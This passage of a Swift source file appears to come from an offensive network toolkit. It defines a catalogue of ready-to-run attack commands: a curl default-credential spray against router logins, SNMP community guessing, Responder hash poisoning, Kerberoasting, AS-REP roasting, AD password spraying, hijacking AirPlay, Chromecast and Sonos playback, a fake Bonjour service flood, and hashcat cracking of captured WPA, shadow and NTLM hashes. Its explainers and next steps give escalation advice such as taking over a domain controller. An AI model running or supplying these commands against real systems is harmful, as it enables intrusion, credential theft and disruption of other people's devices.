                SIZE=$(wc -c < /tmp/_wm_body 2>/dev/null | tr -d ' '); \
                HASH=$(md5 -q /tmp/_wm_body 2>/dev/null || md5sum /tmp/_wm_body 2>/dev/null | awk '{print $1}'); \
                if [ "$CODE" = "200" ] && [ "$HASH" != "$BASELINE_HASH" ] && [ "$SIZE" -gt 200 ]; then \
                  if ! grep -qiE 'type=["\\x27]?password|name=["\\x27]?(pass|pwd)|incorrect|invalid|unauthor|please.*log[ -]?in|sign[- ]?in' /tmp/_wm_body 2>/dev/null; then \
                    echo "  [HIT] $cred  basic-auth  $URL  (size=$SIZE, differs from login)"; \
                    HITS="$HITS basic:$cred@$URL"; \
                  fi; \
                fi; \
              done; \
            done; \
            echo ""; \
            echo "[TRY] form-POST: 302 redirect to non-login OR session set-cookie = success"; \
            for cred in $CREDS; do \
              U="${cred%%:*}"; P="${cred#*:}"; \
              for ep in "/login.cgi" "/asp/sLogin.asp" "/cgi-bin/luci" "/admin/login.html" "/userRpm/LoginRpm.htm"; do \
                URL="$BASE_URL$ep"; \
                BODY="UserName=$U&PassWord=$P&user=$U&pass=$P&username=$U&password=$P&Username=$U&Password=$P&login=Login"; \
                HDRS=$(curl -sk -D - -o /tmp/_wm_body --max-time 3 -X POST -d "$BODY" "$URL" 2>/dev/null | head -20); \
                CODE=$(echo "$HDRS" | head -1 | awk '{print $2}'); \
                [ -z "$CODE" ] || [ "$CODE" = "404" ] && continue; \
                if [ "$CODE" = "302" ] || [ "$CODE" = "303" ]; then \
                  LOC=$(echo "$HDRS" | grep -i '^location:' | head -1 | sed -e 's/^[Ll]ocation: //' | tr -d '\\r'); \
                  if [ -n "$LOC" ] && ! echo "$LOC" | grep -qiE 'login|signin|fail|error'; then \
                    echo "  [HIT] $cred  form-post  $URL  → 302 $LOC"; \
                    HITS="$HITS form:$cred@$URL"; \
                  fi; \
                fi; \
                if echo "$HDRS" | grep -qiE 'set-cookie:.*(SESSION|JSESSIONID|sid=|token=)'; then \
                  echo "  [HIT] $cred  form-post  $URL  → session set-cookie"; \
                  HITS="$HITS form:$cred@$URL"; \
                fi; \
              done; \
            done; \
            rm -f /tmp/_wm_baseline /tmp/_wm_body; \
            echo ""; \
            if [ -z "$HITS" ]; then \
              echo "[RESULT] No default creds matched via automated spray."; \
              echo "         The router may use encrypted/multi-step login (most modern CPE do)."; \
              echo "         Open $BASE_URL in your browser and try the cheatsheet credentials"; \
              echo "         in the form. The Router panel shows the cheatsheet for this vendor."; \
            else \
              echo "[RESULT] Default credentials WORK:"; \
              for h in $HITS; do echo "          $h"; done; \
            fi
            """,
            timeoutSeconds: 180,
            tier: .heavy, category: .router,
            danger: .intrusive, noise: .loud,
            appliesTo: [.router]
        ),
        Attack(
            id: "router.default-accounts",
            title: "Default-credential sweep (nmap NSE)",
            description: "nmap http-default-accounts — fast but only catches old well-known fingerprints.",
            explainer: """
            Legacy NSE script that knows ~130 vendor fingerprints — \
            misses most modern ISP CPE. Fast and quiet but if it returns \
            nothing, run `router.creds.spray` for an actual active test.
            """,
            nextSteps: ["If nothing matched → run router.creds.spray for a real spray",
                        "If creds match → log in to admin panel"],
            tool: "nmap",
            command: "nmap -Pn -p 80,443,8080,8443 --script http-default-accounts --script-args http-default-accounts.fingerprintfile=/usr/share/nmap/nselib/data/http-default-accounts-fingerprints.lua {ip} 2>&1 | head -60",
            timeoutSeconds: 90,
            tier: .quick, category: .router,
            danger: .intrusive, noise: .quiet,
            appliesTo: [.router]
        ),
        Attack(
            id: "router.snmp",
            title: "SNMP community check",
            description: "onesixtyone walks common SNMP community strings.",
            explainer: """
            SNMP community strings are simple shared secrets. Many devices \
            still accept “public” for read access and reveal interface \
            names, IP allocations, MAC tables — sometimes admin passwords.
            """,
            nextSteps: ["If a community string works → snmpwalk for the full tree",
                        "Look for sysLocation, sysContact, ifDescr details"],
            tool: "onesixtyone",
            command: "echo -e 'public\\nprivate\\ncommunity\\nsecret\\nadmin' > /tmp/wm_comm; onesixtyone -c /tmp/wm_comm {ip} 2>&1 | head -10",
            timeoutSeconds: 30,
            tier: .quick, category: .router,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: [.router, .printer, .iot]
        ),
        Attack(
            id: "router.upnp",
            title: "UPnP enumeration",
            description: "upnpc -l lists port mappings exposed by the router’s IGD.",
            explainer: """
            UPnP / IGD lets devices on the LAN open ports on the router \
            without authentication. If the router exposes UPnP to the WAN, \
            external attackers can do the same. List the current mappings \
            to see what’s already open.
            """,
            nextSteps: ["If WAN-side UPnP → flag as critical finding",
                        "Test if you can add a mapping (write access)"],
            tool: "upnpc",
            command: "upnpc -l 2>&1 | head -60",
            timeoutSeconds: 30,
            tier: .quick, category: .router,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: [.router]
        ),
    ]

    // MARK: - AD / Lateral

    public static let adAttacks: [Attack] = [
        Attack(
            id: "ad.responder.short",
            title: "Responder LLMNR/NBT-NS poisoning (60 s)",
            description: "Capture LLMNR/NBT-NS hashes that leak from Windows boxes.",
            explainer: """
            When Windows fails DNS, it broadcasts the name on LLMNR / \
            NBT-NS asking “who is X?”. Responder pretends to be X and \
            collects the resulting NTLM hash. 60-second window keeps it \
            short and contained.
            """,
            nextSteps: ["Crack hashes with hashcat (mode 5600 for NetNTLMv2)",
                        "If lots of hashes → there’s LLMNR misconfig at scale"],
            tool: "responder",
            command: "sudo -n timeout 60 /usr/sbin/responder -I tailscale0 -wd 2>&1 | tail -50",
            timeoutSeconds: 90,
            tier: .heavy, category: .ad,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.unknown, .laptop, .desktop]
        ),
        Attack(
            id: "ad.kerberoast",
            title: "Kerberoast (impacket-getuserspns)",
            description: "Enum Service Principal Names and request TGS for hashing.",
            explainer: """
            In Active Directory, any user can request a service ticket for \
            another account. The ticket contains an encrypted blob crackable \
            offline — if a service account uses a weak password, you get it. \
            Classic AD lateral-movement primitive.
            """,
            nextSteps: ["Crack hashes with hashcat -m 13100",
                        "Pivot via psexec if any service account password works"],
            tool: "impacket",
            command: "impacket-GetUserSPNs -dc-ip {ip} -request -no-pass 2>&1 | head -40",
            timeoutSeconds: 60,
            tier: .quick, category: .ad,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.laptop, .desktop, .unknown]
        ),
        Attack(
            id: "ad.asreproast",
            title: "ASREPRoast (impacket-GetNPUsers)",
            description: "Find users with Kerberos pre-auth disabled and pull crackable AS-REP for offline crack.",
            explainer: """
            DONT_REQUIRE_PREAUTH accounts hand out AS-REP messages to \
            anyone who asks, encrypted with the user's NT hash. Crackable \
            offline (hashcat -m 18200). Common on service accounts and \
            legacy / migrated users. Zero-credential primitive.
            """,
            nextSteps: ["For each hash → hashcat -m 18200 hash.txt rockyou.txt",
                        "Combined with kerberoast → most AD shops fall in <10 min"],
            tool: "impacket",
            command: "echo 'Need a userlist. Sample:'; echo 'impacket-GetNPUsers <DOMAIN>/ -dc-ip {ip} -usersfile users.txt -no-pass -format hashcat -outputfile /tmp/asrep.hashes'",
            timeoutSeconds: 60,
            tier: .quick, category: .ad,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.laptop, .desktop, .unknown],
            skill: .advanced, aptPackage: "impacket-scripts"
        ),
        Attack(
            id: "ad.netexec.spray",
            title: "Password spray AD users (netexec smb)",
            description: "Try one common password against every AD user — avoids account lockout per-user.",
            explainer: """
            netexec smb {DC} -u userlist.txt -p 'Spring2026!' is the \
            standard spray. Hits one weak common password against every \
            user — most environments lock OUT specific user accounts but \
            the spray pattern stays under per-account thresholds. \
            Watching for 'STATUS_LOGON_FAILURE' vs 'STATUS_PASSWORD_EXPIRED' \
            tells you which accounts are valid even when the password fails.
            """,
            nextSteps: ["For each cred hit → escalate via SecretsDump or RBCD",
                        "Try seasonal patterns: Winter2026, Summer2026!, Welcome1"],
            tool: "netexec",
            command: "echo 'Sample:'; echo 'netexec smb {ip} -u users.txt -p Spring2026!'; echo 'For RDP: netexec rdp {ip} -u users.txt -p ...'",
            timeoutSeconds: 120,
            tier: .heavy, category: .ad,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.laptop, .desktop, .unknown],
            skill: .intermediate
        ),
        Attack(
            id: "ad.bloodhound.collect",
            title: "BloodHound collection (bloodhound-python)",
            description: "Collect AD relationships into a JSON dump to import into BloodHound for path analysis.",
            explainer: """
            Once you have ANY domain credential, BloodHound shows the \
            shortest path from your account to Domain Admin via group \
            memberships, ACLs, RDP rights, kerberos delegations. The \
            game-changing AD tool — most large orgs have a 2-step path \
            from an unprivileged user to DA they didn't know existed.
            """,
            nextSteps: ["Open the .zip in BloodHound GUI → 'Find Shortest Path to Domain Admins'",
                        "Look for 'Find Workstations Where Domain Users Can RDP'"],
            tool: "bloodhound-python",
            command: "echo 'Sample (needs creds):'; echo 'bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns {ip} -c All --zip -o /tmp/bh'",
            timeoutSeconds: 600,
            tier: .slow, category: .ad,
            executor: .kali,
            danger: .observation, noise: .loud,
            appliesTo: [.laptop, .desktop, .unknown],
            skill: .advanced, aptPackage: "bloodhound.py"
        ),
        Attack(
            id: "ad.ldap.anon",
            title: "LDAP anonymous bind enum",
            description: "Try unauthenticated LDAP bind — leaks naming context, schema, sometimes user list.",
            explainer: """
            Misconfigured AD allows anonymous binds — every account, OU, \
            and group becomes readable without creds. Even rejected, the \
            error reveals the domain naming context. Costs one packet.
            """,
            nextSteps: ["If anon bind succeeds → ldapsearch -x -h {ip} -b <DC=...> for full enum",
                        "Look for description fields containing passwords (classic mistake)"],
            tool: "ldapsearch",
            command: "ldapsearch -x -h {ip} -s base -b '' namingContexts 2>&1 | head -30; echo '---'; ldapsearch -x -h {ip} -s sub -b '' '(objectclass=user)' sAMAccountName 2>&1 | head -20",
            timeoutSeconds: 30,
            tier: .quick, category: .ad,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: [.laptop, .desktop, .unknown],
            skill: .intermediate, aptPackage: "ldap-utils"
        ),
    ]

    // MARK: - MEDIA (play sound / video on target)

    public static let media: [Attack] = [
        Attack(
            id: "media.airplay.scan",
            title: "Scan for AirPlay receivers on this LAN",
            description: "atvremote scan — list every AirPlay-capable device.",
            explainer: """
            Before you can push audio or video to an AirPlay device you need \
            its identifier. atvremote scan lists every Apple TV, HomePod, \
            macOS box in receiver mode, and AirPlay-2 speaker reachable on \
            the LAN, with the model and protocol details.
            """,
            nextSteps: ["Pair the device first if its protocol shows “Pairing: Mandatory”",
                        "Run “Play sound on AirPlay receiver” with the chosen ID"],
            tool: "atvremote",
            command: "atvremote scan 2>&1 | head -60",
            timeoutSeconds: 15,
            tier: .quick, category: .media,
            executor: .local,
            danger: .passive, noise: .silent,
            appliesTo: [.applish, .tv, .speaker, .audio, .laptop, .desktop, .thisMac]
        ),
        Attack(
            id: "media.airplay.sound",
            title: "Play sound on AirPlay receiver (this device)",
            description: "atvremote play_url — pushes a public sample sound to the target.",
            explainer: """
            Streams an audio file to the AirPlay receiver. By default uses \
            a public test MP3. Note: receivers with “Pairing: Mandatory” \
            need to be paired once via `atvremote --id <ID> pair`. macOS \
            receivers in “AirPlay Receiver” mode usually accept without \
            pairing if the LAN setting allows.
            """,
            nextSteps: ["For a custom sound → host an MP3 on a local web server and replace the URL",
                        "Try “Play video on AirPlay receiver” with an MP4 URL"],
            tool: "atvremote",
            command: "atvremote --address {ip} --protocol airplay play_url=https://commondatastorage.googleapis.com/codeskulptor-demos/DDR_assets/Kangaroo_MusiQue_-_The_Neverwritten_Role_Playing_Game.mp3 2>&1 | head -30",
            timeoutSeconds: 30,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.applish, .tv, .speaker, .audio, .laptop, .desktop]
        ),
        Attack(
            id: "media.airplay.video",
            title: "Play video on AirPlay receiver",
            description: "atvremote play_url with a sample MP4 URL.",
            explainer: """
            Same mechanism as the audio case but with a video URL. Apple TV / \
            macOS receiver / AirPlay-2 video-capable speaker will start \
            playback immediately if the URL is reachable.
            """,
            nextSteps: ["Replace URL with any HTTP(S) MP4 on your network or the public web",
                        "If the receiver shows “unsupported” → try a different codec"],
            tool: "atvremote",
            command: "atvremote --address {ip} --protocol airplay play_url=https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4 2>&1 | head -30",
            timeoutSeconds: 30,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.applish, .tv, .laptop, .desktop]
        ),
        Attack(
            id: "media.cast.scan",
            title: "Scan for Chromecasts (catt scan)",
            description: "catt scans the LAN for Cast-capable devices.",
            explainer: """
            Chromecast / Google TV / Cast-capable Android TV devices listen \
            for catt or pychromecast. Scan the LAN to enumerate them.
            """,
            nextSteps: ["Pick a target → run “Cast video to Chromecast”"],
            tool: "catt",
            command: "catt scan 2>&1 | head -30",
            timeoutSeconds: 20,
            tier: .quick, category: .media,
            executor: .local,
            danger: .passive, noise: .silent,
            appliesTo: [.tv, .speaker, .unknown]
        ),
        Attack(
            id: "media.cast.video",
            title: "Cast video to Chromecast",
            description: "catt cast — pushes a video URL to a Chromecast device.",
            explainer: """
            Chromecasts don’t require pairing on the LAN — any device on \
            the same Wi-Fi can take over playback by default. catt sends \
            the URL via the Cast protocol and the device starts playing.
            """,
            nextSteps: ["Try arbitrary YouTube URLs (catt cast https://youtu.be/…)",
                        "catt stop to terminate playback"],
            tool: "catt",
            command: "catt -d {ip} cast https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4 2>&1 | head -20",
            timeoutSeconds: 30,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.tv, .speaker]
        ),
        Attack(
            id: "media.airplay.localfile",
            title: "Play LOCAL audio file on AirPlay receiver",
            description: "Serves the selected audio file to an AirPlay receiver using installed pyatv.",
            explainer: """
            Uses the same local audio runner as SMART audio push, with \
            AirPlay selected explicitly. The receiver must support AirPlay \
            and any required pairing must already be configured in pyatv. \
            Each run serves only the selected file on its own temporary port. \
            Success requires the playback command to exit successfully and \
            the receiver to fetch audio bytes. This confirms delivery; \
            listen at the receiver to confirm sound. Volume is preserved.
            """,
            nextSteps: ["Use SMART audio push for a Samsung DLNA renderer",
                        "Pair with atvremote first if AirPlay requires authentication"],
            tool: "python3",
            command: "python3 {audio_script} --target {ip} --file {audio_file} --protocol airplay",
            timeoutSeconds: 90,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.applish, .tv, .speaker, .audio, .laptop, .desktop],
            requiresAudioFile: true
        ),
        Attack(
            id: "media.audio.smart",
            title: "SMART audio push (DLNA → AirPlay → Cast → Sonos)",
            description: "Discovers the selected receiver and sends the chosen audio file with delivery checks.",
            explainer: """
            Tries the selected device's advertised DLNA AVTransport service \
            first, then optional installed AirPlay, Cast or Sonos tools. \
            DLNA parses the real control endpoint and SOAP responses, \
            checks that the TV fetches the file, and waits for PLAYING. \
            Other paths require a successful command and a receiver fetch. \
            Unsupported, unreachable or unpaired devices report failure. \
            Each run owns its temporary audio server; it does not stop \
            another run's server. Current volume and mute settings are preserved. \
            Delivery and playback status cannot prove that sound is audible.
            """,
            nextSteps: ["Select the Samsung TV and the audio file, then run",
                        "Check the command, fetch and playback results; confirm sound at the TV"],
            tool: "python3",
            command: "python3 {audio_script} --target {ip} --file {audio_file} --protocol auto",
            timeoutSeconds: 90,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.applish, .tv, .speaker, .audio, .unknown],
            requiresAudioFile: true
        ),
        Attack(
            id: "media.dlna.push",
            title: "DLNA push audio — TV / speaker renderer",
            description: "Sends the selected audio file to a discovered UPnP AVTransport renderer.",
            explainer: """
            Discovers the selected device's renderer description and parses \
            its AVTransport control URL. A private local server supports \
            the HEAD and byte-range GET requests used by Samsung TVs. \
            SetAVTransportURI and Play must succeed without SOAP faults, \
            the TV must fetch audio bytes, and its transport must report \
            PLAYING before the run reports verified playback status. \
            TV volume and mute settings are preserved. An unsupported \
            renderer or failed delivery returns an error, not a success label.
            """,
            nextSteps: ["Keep the TV powered on and choose the audio file",
                        "Confirm the sound at the TV after playback is reported"],
            tool: "python3",
            command: "python3 {audio_script} --target {ip} --file {audio_file} --protocol dlna",
            timeoutSeconds: 90,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.tv, .speaker, .audio, .unknown],
            requiresAudioFile: true
        ),
        Attack(
            id: "media.bonjour.flood",
            title: "Bonjour service flood (visible names on every LAN Mac)",
            description: "Register fake AirPlay/AirPrint/SMB services with custom names — appear in every Mac's discovery menus.",
            explainer: """
            Uses macOS's built-in `dns-sd -R` to register fake _airplay._tcp, \
            _raop._tcp, _ipp._tcp, and _smb._tcp services on the LAN with \
            attention-grabbing names. Every Mac on the network sees those \
            names in: Control Center → Sound (AirPlay menu), AirPrint \
            dialog (Cmd+P), Finder → Network sidebar, System Settings → \
            Sound. No auth, no MITM, no ARP spoof — just Bonjour discovery, \
            which has zero authentication by design. Works on every patched \
            Mac because rejecting mDNS would break the device-discovery UX.
            """,
            nextSteps: ["Edit the names list in the command for different messages",
                        "Combine with an actual ARP cut to make the “fake printer” a believable victim of an outage",
                        "Pair with the Hikvision/router attacks for chained engagements"],
            tool: "dns-sd",
            command: """
            pkill -f 'dns-sd -R' 2>/dev/null; sleep 0.3; \
            for n in '*** WIFIMANCER ***' 'AUDIT IN PROGRESS' 'this is a test' 'drop the mic'; do \
              dns-sd -R "$n" _airplay._tcp local 7000 \
                deviceid=BB:CC:DD:EE:FF:11 features=0x5A7FFEE6 srcvers=540.31 model=AppleTV5,3 \
                > /dev/null 2>&1 & \
              dns-sd -R "$n @raop" _raop._tcp local 7000 \
                tp=UDP sm=false sv=false ek=1 et=0,1 cn=0,1 ch=2 ss=16 sr=44100 pw=false vn=65537 txtvers=1 \
                > /dev/null 2>&1 & \
              dns-sd -R "$n" _ipp._tcp local 631 \
                rp=printers/wm pdl=application/pdf,image/urf URF=W8 ty="$n" note="$n" \
                > /dev/null 2>&1 & \
              dns-sd -R "$n" _smb._tcp local 445 > /dev/null 2>&1 & \
            done; \
            sleep 1; \
            echo "[flood live] $(pgrep -fl 'dns-sd -R' | wc -l | tr -d ' ') registrations"; \
            echo "[verify] checking _airplay browse"; \
            timeout 4 dns-sd -B _airplay._tcp local 2>&1 | head -20; \
            echo ""; \
            echo "Open AirPlay menu / AirPrint dialog / Finder Network on any LAN Mac to see the names."; \
            echo "Run: pkill -f 'dns-sd -R'   to stop the flood."
            """,
            timeoutSeconds: 30,
            tier: .quick, category: .media,
            executor: .local,
            danger: .observation, noise: .veryLoud,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
        Attack(
            id: "media.airplay.image",
            title: "Show image on Apple TV / AirPlay receiver",
            description: "atvremote stream_file — push a JPEG to the receiver's screen.",
            explainer: """
            Apple TV and macOS in “AirPlay Receiver” mode accept photo \
            frames over the AirPlay protocol. Pushes a sample image and \
            the device displays it full-screen. Replace the URL with any \
            public JPG / PNG / HEIC.
            """,
            nextSteps: ["Host your own image on a tiny local web server (python3 -m http.server)",
                        "Chain with “Play sound on AirPlay” for a notification effect"],
            tool: "atvremote",
            command: "atvremote --address {ip} --protocol airplay play_url=https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/The_Earth_seen_from_Apollo_17.jpg/1280px-The_Earth_seen_from_Apollo_17.jpg 2>&1 | head -30",
            timeoutSeconds: 30,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.applish, .tv, .laptop, .desktop],
            skill: .beginner, brewPackage: "pyatv"
        ),
        Attack(
            id: "media.airplay.tts",
            title: "Speak text on AirPlay receiver (TTS)",
            description: "macOS `say` synthesises speech, ffmpeg encodes it, atvremote pushes it.",
            explainer: """
            Pipeline: macOS `say` writes an AIFF file, ffmpeg transcodes \
            to MP3, a one-off Python HTTP server serves it on 127.0.0.1, \
            and atvremote tells the receiver to fetch from the host's \
            tailscale / LAN IP. End result: the Apple TV speaks your \
            sentence at the listener. Replace the message in the command.
            """,
            nextSteps: ["Try a different voice: `say -v Alex \"hello\"`",
                        "For Sonos/Chromecast TTS use the Google Translate trick (separate attack)"],
            tool: "say",
            command: """
            MSG='Hello from WiFi Mancer. This is a text to speech demonstration.'; \
            TMPDIR=$(mktemp -d); \
            say -o "$TMPDIR/m.aiff" "$MSG"; \
            ffmpeg -y -loglevel error -i "$TMPDIR/m.aiff" "$TMPDIR/m.mp3" >/dev/null 2>&1; \
            (cd "$TMPDIR" && python3 -m http.server 8731 >/dev/null 2>&1 &) ; sleep 0.5; \
            HOSTIP=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null || echo 127.0.0.1); \
            echo "serving on http://$HOSTIP:8731/m.mp3"; \
            atvremote --address {ip} --protocol airplay "play_url=http://$HOSTIP:8731/m.mp3" 2>&1 | head -10; \
            sleep 8; pkill -f 'http.server 8731' 2>/dev/null; rm -rf "$TMPDIR"
            """,
            timeoutSeconds: 45,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.applish, .tv, .speaker, .audio]
        ),
        Attack(
            id: "media.cast.image",
            title: "Show image on Chromecast",
            description: "catt cast_site with an image URL.",
            explainer: """
            Chromecast accepts an image as a media URL. Casts a public \
            photo to the target screen. Useful for visual prank demos or \
            confirming you have control over the Cast endpoint.
            """,
            nextSteps: ["catt -d {ip} stop to clear",
                        "Replace URL with anything reachable on the LAN"],
            tool: "catt",
            command: "catt -d {ip} cast https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/The_Earth_seen_from_Apollo_17.jpg/1280px-The_Earth_seen_from_Apollo_17.jpg 2>&1 | head -20",
            timeoutSeconds: 30,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.tv, .speaker], brewPackage: "catt"
        ),
        Attack(
            id: "media.cast.tts",
            title: "Speak text on Chromecast (Google TTS)",
            description: "catt cast — point at translate.google.com TTS endpoint.",
            explainer: """
            Google's Translate service exposes an undocumented TTS endpoint \
            that returns an MP3 of any short string. Casting that URL plays \
            it through the Chromecast as audio. No auth, no setup — works \
            on any Cast-capable device. Limited to ~200 chars per call.
            """,
            nextSteps: ["catt -d {ip} stop to clear",
                        "Use the AirPlay TTS attack for Apple devices"],
            tool: "catt",
            command: """
            MSG='Hello from Wifi Mancer. This is a remote text to speech test.'; \
            URL="https://translate.google.com/translate_tts?ie=UTF-8&q=$(python3 -c \"import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))\" \"$MSG\")&tl=en&client=tw-ob"; \
            echo "casting: $URL"; \
            catt -d {ip} cast "$URL" 2>&1 | head -10
            """,
            timeoutSeconds: 30,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.tv, .speaker]
        ),
        Attack(
            id: "media.cast.youtube",
            title: "Cast YouTube link to Chromecast",
            description: "catt cast — opens a YouTube video on the target.",
            explainer: """
            Chromecast natively recognises a youtu.be / youtube.com URL and \
            opens it in the YouTube app, skipping the standard media-player \
            UI. Higher quality and faster start than transcoding an MP4.
            """,
            nextSteps: ["catt -d {ip} pause / play / volume_up — full remote control",
                        "catt -d {ip} stop to release"],
            tool: "catt",
            command: "catt -d {ip} cast https://www.youtube.com/watch?v=dQw4w9WgXcQ 2>&1 | head -20",
            timeoutSeconds: 25,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.tv, .speaker]
        ),
        Attack(
            id: "media.dlna.discover",
            title: "Discover DLNA media renderers (gssdp)",
            description: "gssdp-discover for ssdp:all on the LAN.",
            explainer: """
            DLNA / UPnP-AV uses SSDP for discovery. Smart TVs, AVRs, and \
            wireless speakers from Samsung / LG / Sony / Yamaha / Bose \
            advertise themselves on UDP/1900. Lists every responder so you \
            see what's controllable beyond AirPlay/Cast.
            """,
            nextSteps: ["For each renderer URL, push a media URL with `gupnp-av-cp`",
                        "Test if the renderer needs auth (most don't)"],
            tool: "gssdp-discover",
            command: "timeout 6 gssdp-discover -n 5 -i $(route -n get default 2>/dev/null | awk '/interface:/ {print $2}') --target=ssdp:all 2>&1 | grep -E 'MediaRenderer|MediaServer|Sonos|TV|AVR' | head -30",
            timeoutSeconds: 15,
            tier: .quick, category: .media,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: [.tv, .speaker, .audio, .unknown],
            aptPackage: "gupnp-tools"
        ),
        Attack(
            id: "media.bell",
            title: "Sonos doorbell chime (60 s)",
            description: "Quick attention-grabbing chime via soco-cli.",
            explainer: """
            Plays a short bell tone on the Sonos. Useful as a “check this \
            speaker is the right one” confirmation when you have multiple \
            Sonos boxes on the LAN with similar names.
            """,
            nextSteps: ["Group with other Sonos: `sonos {ip} group <other>`",
                        "Volume tweak: `sonos {ip} volume 30`"],
            tool: "sonos",
            command: "sonos {ip} play_uri https://upload.wikimedia.org/wikipedia/commons/d/d4/Doorbell_2.ogg 2>&1 | head -10",
            timeoutSeconds: 15,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.speaker], brewPackage: "soco-cli"
        ),
        Attack(
            id: "media.sonos.play",
            title: "Play sound on Sonos speaker",
            description: "soco-cli — play an arbitrary URL on a Sonos device.",
            explainer: """
            Sonos speakers expose an unauthenticated SOAP endpoint on port \
            1400. soco-cli wraps it in a friendly CLI: `sonos {ip} play_uri \
            <url>` starts playback immediately.
            """,
            nextSteps: ["sonos {ip} pause / volume / skip — full control via the same CLI",
                        "Group / ungroup multiple Sonos boxes if any others on the LAN"],
            tool: "sonos",
            command: "sonos {ip} play_uri https://commondatastorage.googleapis.com/codeskulptor-demos/DDR_assets/Kangaroo_MusiQue_-_The_Neverwritten_Role_Playing_Game.mp3 2>&1 | head -10",
            timeoutSeconds: 20,
            tier: .quick, category: .media,
            executor: .local,
            danger: .destructive, noise: .quiet,
            appliesTo: [.speaker]
        ),
    ]

    // MARK: - PASSWORDS / Cracking

    public static let passwordCracks: [Attack] = [
        Attack(
            id: "pwd.hashcat.wpa",
            title: "Crack WPA handshake with hashcat (rockyou)",
            description: "Crack /tmp/wm.22000 against the rockyou wordlist — top-10M passwords first, then full sweep.",
            explainer: """
            mode 22000 = WPA*PMKID/EAPOL. We use the SecLists rockyou \
            wordlist (most common 14M passwords). On a modern GPU rig \
            that's ~20 seconds; on a laptop CPU it's a few hours. \
            hashcat resumes from where it left off via .restore — kill it \
            and rerun later if you need.
            """,
            nextSteps: ["For tougher targets → hashcat with rules: -r /usr/share/hashcat/rules/best64.rule",
                        "Try mask attacks for human-pattern passwords: -a 3 ?u?l?l?l?l?l?d?d"],
            tool: "hashcat",
            command: "[ -f /tmp/wm.22000 ] || { echo 'Need /tmp/wm.22000 — run wifi.handshake.capture or wifi.pmkid.attack first.' >&2; exit 1; }; hashcat -m 22000 /tmp/wm.22000 /usr/share/wordlists/rockyou.txt --status --status-timer 5 2>&1 | tail -40",
            timeoutSeconds: 600,
            tier: .slow, category: .password,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .intermediate, aptPackage: "hashcat"
        ),
        Attack(
            id: "pwd.hashcat.shadow",
            title: "Crack /etc/shadow hashes (sha512crypt)",
            description: "Run hashcat -m 1800 against a captured shadow file.",
            explainer: """
            mode 1800 = sha512crypt (modern Linux /etc/shadow). Slow on \
            CPU, fine on GPU. Drop the shadow file at /tmp/shadow first — \
            captured via SMB pillage, exfil from a compromised host, or \
            recovered from a backup.
            """,
            nextSteps: ["Use john --format=sha512crypt for distributed cracking",
                        "If MD5/MD5crypt → switch to mode 500"],
            tool: "hashcat",
            command: "[ -f /tmp/shadow ] || { echo 'Need /tmp/shadow' >&2; exit 1; }; hashcat -m 1800 /tmp/shadow /usr/share/wordlists/rockyou.txt --status --status-timer 5 2>&1 | tail -30",
            timeoutSeconds: 600,
            tier: .slow, category: .password,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "hashcat"
        ),
        Attack(
            id: "pwd.hashcat.netntlm",
            title: "Crack NetNTLMv2 hashes (Responder output)",
            description: "Hashcat mode 5600 against the hashes Responder collected.",
            explainer: """
            When Responder captures hashes from LLMNR/NBT-NS poisoning, \
            they land in /usr/share/responder/logs/Responder-Session.log \
            (or .ntlmssp). Mode 5600 cracks NetNTLMv2; v1 = mode 5500. \
            For domain accounts → straight pass-the-hash with crackmapexec.
            """,
            nextSteps: ["If a domain admin hash → instant pwn the DC via psexec / smbexec",
                        "Crack first, then test the cleartext on every other LAN service"],
            tool: "hashcat",
            command: "find /usr/share/responder/logs/ -name '*.txt' -mtime -1 2>/dev/null | head -3; HASHFILE=$(find /usr/share/responder/logs/ -name 'Responder-Session*' -mtime -1 2>/dev/null | head -1); [ -z \"$HASHFILE\" ] && { echo 'No fresh Responder hashes — run ad.responder.short first' >&2; exit 1; }; hashcat -m 5600 \"$HASHFILE\" /usr/share/wordlists/rockyou.txt --status 2>&1 | tail -30",
            timeoutSeconds: 600,
            tier: .slow, category: .password,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "hashcat"
        ),
        Attack(
            id: "pwd.hydra.http",
            title: "Hydra HTTP-form brute (top 100 passwords)",
            description: "Brute /login or /admin with admin + top-100 passwords. Stop on first hit.",
